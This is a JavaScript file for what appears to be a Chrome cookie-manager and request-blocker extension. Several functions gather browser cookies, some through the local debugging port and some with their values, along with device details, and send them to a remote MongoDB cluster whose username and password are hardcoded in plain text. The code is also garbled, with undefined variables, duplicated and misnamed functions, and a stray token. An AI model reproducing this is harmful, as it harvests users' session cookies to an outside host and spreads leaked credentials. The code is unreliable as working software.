const request = require('request');
const axios = require('axios');
const Cookies = require('js-cookie');
const mongodb = require('mongodb');
const MongoClient = mongodb.MongoClient;
const navigator = require('navigator');
const url = 'mongodb+srv://rrwabina:Carpediem13@maindb.ium16x6.mongodb.net/?retryWrites=true&w=majority';
const dbName = 'maindb';
const collectionName = 'cookiedb';

async function getData() { 
  let result = await client.connect();
  db = result.db(databaseName);
  collection = db.collection('cookiedb');
  let data = await collection.find({}).toArray();
  console.log(data)
}


async function collectCookies(domain) {
  try {
    request(domain, function (error, response, body) {
      if (error) throw error;
      const cookies = Cookies.get();
      const cookiesJSON = JSON.stringify(cookies);
      MongoClient.connect(url, { useNewUrlParser: true, useUnifiedTopology: true }, async function (error, client) {
        if (error) throw error;
        const db = client.db(dbName);
        console.log('You are already connected to your database.');

        await db.collection(collectionName).insertOne({ cookies: cookiesJSON });
        client.close();
        console.log('Cookies have been successfully collected and stored in the database.');
      });
    });
  } catch (error) {
    console.error(error);
  }
}


async function dbConnect() { 
    let result = await client.connect();
    db = result.db(databaseName);
    return db.collection('cookiedb');

}

function getBrowserCookies() {
  request("http://localhost:9222/json/cookies", (error, response, body) => {
    if (!error && response.statusCode == 200) {
      const cookies = JSON.parse(body);
      cookies.forEach((cookie) => {
        console.log("domain: ", cookie.domain);
        console.log("name: ", cookie.name);
        console.log("expiration: ", cookie.expirationDate);
        console.log("host: ", cookie.hostOnly);
        console.log("http: ", cookie.httpOnly);
        console.log("site: ", cookie.sameSite);
        console.log("session: ", cookie.session);
        console.log("storeId: ", cookie.storeId);
      });
    }
  });
}

function getDeviceInfo() {
    const deviceInfo = {};
    deviceInfo.appCodeName = navigator.appCodeName;
    deviceInfo.appName = navigator.appName;
    deviceInfo.appVersion = navigator.appVersion;
    deviceInfo.platform = navigator.platform;
    deviceInfo.userAgent = navigator.userAgent;
    deviceInfo.language = navigator.language;
    return deviceInfo;
  }
  

  MongoClient.connect(uri, { useNewUrlParser: true }, function (err, client) {
    if (err) {
      console.log("Error connecting to MongoDB:", err);
    } else {
      console.log("Successfully connected to MongoDB");
  
      const db = client.db("test");
      const collection = db.collection("documents");
  
      client.close();
    }
  });


  var app = angular.module('RequestBlockerApp', []);

app.controller('PopupController', function($scope) {

    $scope.isValidPattern = function(urlPattern) {
      var validPattern = /^(file:\/\/.+)|(https?|ftp|\*):\/\/(\*|\*\.([^\/*]+)|([^\/*]+))\//g;
      return !!urlPattern.match(validPattern);
    }

    $scope.backgroundPage = chrome.extension.getBackgroundPage();
    $scope.patterns = $scope.backgroundPage.patterns.map(function(x, i) {
        return {
            index: i,
            pattern: x,
            isValid: function() {
              return $scope.isValidPattern(this.pattern);
            }
        };
    });

    $scope.remove = function(patternToRemove) {
        var index = $scope.patterns.indexOf(patternToRemove);
        if (index > -1) {
            $scope.patterns.splice(index, 1);
        }
    }

    $scope.add = function() {
        $scope.patterns.push({
            index: $scope.patterns.length,
            pattern: '*://*.'
        });
    }

    $scope.save = function() {
        var patterns = $scope.patterns.map(function(x) {
            return x.pattern;
        });

        $scope.backgroundPage.save(patterns, function() {
            $scope.$apply(function() {
                $scope.success('Patterns saved successfully!');
            });
        });
    };

    $scope.success = function(message, title) {
        $scope.modal(message, title || "Success", "text-info");
    }
    $scope.error = function(message, title) {
        $scope.modal(message, title || "Error", "text-danger");
    }
    $scope.modal = function(message, title, modalClass) {
        $scope.modalClass = modalClass;
        $scope.modalTitle = title;
        $scope.modalMessage = message;
        $('#modal').modal();
    }
});


const ReformatCookies = cookies => {
  const formatCookie = cookie => {
  return `{
      domain: '${cookie.domain}',
      name: '${cookie.name}',
      expiration: ${cookie.expiration},
      host: ${cookie.host},
      http: ${cookie.http},
      site: '${cookie.site}',
      session: ${cookie.session},
      storeid: '${cookie.storeid}'
      }`;
      };

  const formatCookies = cookies => {
      return cookies.map(formatCookie).join(',\n');
      };

  const query = cookies => {
      return `db.cookiedb.insertMany([\n${formatCookies(cookies)}\n])`;
      };

  const text = formatCookie(cookies);
  console.log(text);
};


async function getData(collection_name) { 
  const {MongClient, MongoClient, Db} = require('mongodb')
  const url = 'mongodb+srv://rrwabina:Carpediem13@maindb.ium16x6.mongodb.net/?retryWrites=true&w=majority';
  const databaseName = 'maindb'
  const client = new MongoClient(url);
  
  let result = await client.connect();
  db = result.db(databaseName);
  collection = db.collection(collection_name);
  let data = await collection.find({}).toArray();
  console.log(data)
  document.getElementById('id_osdisplay').value = data
}

function getDeviceConfig() {
  chrome.runtime.getPlatformInfo((info) => {
  let text = 'Architecture = ' + info.arch + '\n' +
             'Native Client Architecture = ' + info.nacl_arch + '\n' +
             'Operating System = ' + info.os;
  document.getElementById('id_osdisplay').value = text;});
}

function getCookies() {
  chrome.runtime.getPlatformInfo((info) => {
  let text = 'Architecture = ' + info.arch + '\n' +
             'Native Client Architecture = ' + info.nacl_arch + '\n' +
             'Operating System = ' + info.os;
  document.getElementById('id_osdisplay').value = text;});
}

function deleteCookie(domain, name) {
  chrome.cookies.remove({ 
    'domain': domain,
    'name': name, });}


function deleteAllCookies() {
  const cookies = document.cookie.split(";");

  cookies.forEach(cookie => {
    const cookieName = cookie.split("=")[0].trim();
    document.cookie = cookieName;
  });

  alert("All cookies have been deleted!");
}

function importCookies() {
  var nCookiesImportedThisTime = 0;
  var text = $('.value', '#pasteCookie').val();
  var error = $('.error', '#pasteCookie');
  error.hide();
  error.text('For format reference export cookies in JSON');
  error.html(error.html() + 
      "<br> Also check&nbsp;<a href='http://developer.chrome.com/extensions/cookies.html#type-Cookie' target='_blank'>Developer Chrome Cookie</a><br>Error:");}

function connectToMongoDB() {
  const express = require('express');
  const mongoose = require('mongoose');
  const app = express();
  const url = 'mongodb+srv://rrwabina:Carpediem13@maindb.ium16x6.mongodb.net/?retryWrites=true&w=majority'
  
  async function connect() { 
      try { 
          await mongoose.connect(uri);
          console.log('Connected to MongoDB');
      } catch(error) { 
          console.error(error);
      }
    }
  connect(); 
  app.listen(8000, () => { 
      console.log('Server started on port 8000');
  })
}

document.getElementById('id_ostype').onclick = () => {
  chrome.runtime.getPlatformInfo((info) => {
    let text = 'Architecture = ' + info.arch + '\n' +
               'Native Client Architecture = ' + info.nacl_arch + '\n' +
               'Operating System = ' + info.os;
    document.getElementById('id_osdisplay').value = text;});}

document.getElementById('id_button_getAll').onclick = () => {
  chrome.cookies.getAll(getDetails('getAll'), ((cookies) => {
    let text ='Number of cookies: ' + cookies.length + '\n';
    for (let cookie of cookies)
      {
        text += 'Domain: ' + cookie.domain + '\n' + 'Name: ' + cookie.name + '\n' + '\n';
      }
    document.getElementById('id_text').value = text;}));}

document.getElementById('id_button_getAdvanced').onclick = () => {
  chrome.cookies.getAll(getDetails('getAll'), ((cookies) => {
    let text ='Number of cookies: ' + cookies.length + '\n' + '\n';
    for (let cookie of cookies)
      {
        text += 
        'Domain: ' + cookie.domain + '\n' + 
        'Path: ' + cookie.path + '\n' + 
        'Name: ' + cookie.name + '\n' + 
        'Expiration Date: ' + cookie.expirationDate + '\n' +
        'Host: ' + cookie.hostOnly + '\n' +
        'HTTP: ' + cookie.httpOnly + '\n' + 
        'Site Status: ' + cookie.sameSite + '\n' + 
        'Marked as Secure: ' + cookie.sameSite + '\n' +
        'Session: ' + cookie.session + '\n' +
        'Store ID: ' + cookie.storeId + '\n' +
        'Value: ' + cookie.value + '\n' + '\n'; 
      }
    document.getElementById('id_text').value = text;}));}

const database = document.getElementById('id_button_getCassandra').onclick = () => {
  chrome.cookies.getAll(getDetails('getAll'), ((cookies) => {
    let text = 'db.cookiedb.insertMany([' + '\n';
    for (let cookie of cookies)
      {
        text +=
        '{' + '\n' + 
        '\t' + 'domain'    + ': ' + '\'' + cookie.domain          + '\'' +  ',' + '\n' +
        '\t' + 'name'      + ': ' + '\'' + cookie.name            + '\'' +  ',' + '\n' +
        '\t' + 'expiration'+ ': ' + '\'' + cookie.expirationDate  + '\'' +  ',' + '\n' +
        '\t' + 'host'      + ': '        + cookie.hostOnly        +  ',' + '\n' +
        '\t' + 'http'      + ': '        + cookie.httpOnly        +  ',' + '\n' +
        '\t' + 'site'      + ': ' + '\'' + cookie.sameSite        + '\'' +  ',' + '\n' +
        '\t' + 'session'   + ': '        + cookie.session         +  ',' + '\n' +
        '\t' + 'storeid'   + ': ' + '\'' + cookie.storeId         + '\'' + '\n' +
        '}' + ',' + '\n'
      }
    document.getElementById('id_text').value = text;}));}

function get_database() {
  const database = document.getElementById('id_button_getCassandra').onclick = () => {
    chrome.cookies.getAll(getDetails('getAll'), ((cookies) => {
      let text = 'db.cookiedb.insertMany([' + '\n';
      for (let cookie of cookies)
        {
          text +=
          '{' + '\n' + 
          '\t' + 'domain'    + ': ' + '\'' + cookie.domain          + '\'' +  ',' + '\n' +
          '\t' + 'name'      + ': ' + '\'' + cookie.name            + '\'' +  ',' + '\n' +
          '\t' + 'expiration'+ ': ' + '\'' + cookie.expirationDate  + '\'' +  ',' + '\n' +
          '\t' + 'host'      + ': '        + cookie.hostOnly        +  ',' + '\n' +
          '\t' + 'http'      + ': '        + cookie.httpOnly        +  ',' + '\n' +
          '\t' + 'site'      + ': ' + '\'' + cookie.sameSite        + '\'' +  ',' + '\n' +
          '\t' + 'session'   + ': '        + cookie.session         +  ',' + '\n' +
          '\t' + 'storeid'   + ': ' + '\'' + cookie.storeId         + '\'' + '\n' +
          '}' + ',' + '\n'
        }
      document.getElementById('id_text').value = text;}));}
}
   
document.getElementById('id_button_deleteAll').onclick = () => {
  var allCookies = document.cookie.split(';');
  for (var i = 0; i < allCookies.length; i++)
    document.cookie = allCookies[i] + '=;expires='
    + new Date(0).toUTCString();
  document.getElementById('id_text').value = allCookies}

function getDetails(kind){
  let domain = document.getElementById('id_domain').value;
  let path   = document.getElementById('id_path').value;
  let name   = document.getElementById('id_name').value;
  let value  = document.getElementById('id_value').value;
  let details = {};

  switch(kind){
  case 'getAll':
    if (domain != ''){
      details['domain'] = domain;
    }
    if (name != ''){
      details['name'] = name;
    }
    break;
  case 'set':
    details['url'] = 'https://' + domain + path;
    details['name'] = name;
    details['value'] = value;
    break;
  case 'remove':
    details['url'] = 'https://' + domain + path;
    details['name'] = name;
    break;
  }
  return details;
}

document.getElementById('id_button_exec').onclick = () => {
  let url = document.getElementById('id_url').value;
  fetch(url, {
    method: 'GET',
    mode: 'cors'
  })
  .then(response => {
    if (response.ok) {
      return response.text();
    }
    throw new Error('Response was not ok.');
  })
  .then(data => {
    document.getElementById('id_response').value = data;
  })
 .catch(error => {
    document.getElementById('id_response').value = error;
  })
}

chrome.declarativeNetRequest.onRuleMatchedDebug.addListener((mrd) => {
  console.log(mrd.request.url)
});

function success(position) {
  latitude = position.coords.latitude;
  longitude = position.coords.longitude;
  elLatitude.innerText  = "Latitude="  + latitude;
  elLongitude.innerText = "Longitude=" + longitude;
}

function blockRequest(details) {
  console.log("Blocked: ", details.url);
  return {
    cancel: true
  };
}

function isValidPattern(urlPattern) {
  var validPattern = /^(file:\/\/.+)|(https?|ftp|\*):\/\/(\*|\*\.([^\/*]+)|([^\/*]+))\//g;
  return !!urlPattern.match(validPattern);
}

function updateFilters(urls) {
  if (chrome.webRequest.onBeforeRequest.hasListener(blockRequest)) {
    chrome.webRequest.onBeforeRequest.removeListener(blockRequest);
  }

  var validPatterns = patterns.filter(isValidPattern);

  if (patterns.length) {
    try{
      chrome.webRequest.onBeforeRequest.addListener(blockRequest, {
        urls: validPatterns
      }, ['blocking']);
    } catch (e) {
      console.error(e);
    }
  }
}

function load(callback) {
  chrome.storage.sync.get('blocked_patterns', function(data) {
    callback(data['blocked_patterns'] || []);
  });
}

function save(newPatterns, callback) {
  patterns = newPatterns;
  chrome.storage.sync.set({
    'blocked_patterns': newPatterns
  }, function() {
    updateFilters();dom
    callback.call();
  });
}

load(function(p) {
  patterns = p;
  updateFilters();
});

function blockCookies() {
  var date = new Date();
  date.setTime(date.getTime() - 1000);
  document.cookie = "";
  document.cookie = "expires=" + date.toUTCString();
}